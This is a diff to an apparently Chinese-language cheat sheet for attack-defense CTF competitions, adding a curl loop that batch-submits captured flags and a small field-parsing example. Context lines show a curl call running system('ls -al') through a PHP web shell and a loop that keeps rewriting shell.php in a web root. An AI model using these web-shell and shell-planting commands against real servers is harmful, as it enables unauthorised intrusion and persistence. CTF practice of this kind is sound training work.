@@ -125,3 +125,36 @@ curl http://172.16.2.234:8011/index.php --data "2=v5est0r&1=system('ls -al')"
 while (true);do echo test >/var/www/html/shell.php;done &
 ```
 
+## 批量提交flag
+#### if题目要求只提交flag：
+```
+for i in `cat flag.txt`;do curl 172.16.2.234:8888/commit.php --data "myid=001&flag=$i" -s --cookie "PHPSESSID=fl51bmlkjhiblfttram3fg76n1";done
+```
+#### if题目要求提交ip和flag
+```
+root@kali:/# cat 1
+aa,bb,cc
+aa,bb,cc
+aa,bb,cc
+aa,bb,cc
+aa,bb,cc
+aa,bb,cc
+aa,bb,cc
+aa,bb,cc
+aa,bb,cc
+root@kali:/# cat 1|cut -d \, -f 2
+bb
+bb
+bb
+bb
+bb
+bb
+bb
+bb
+bb
+```
+
+
+
+
+
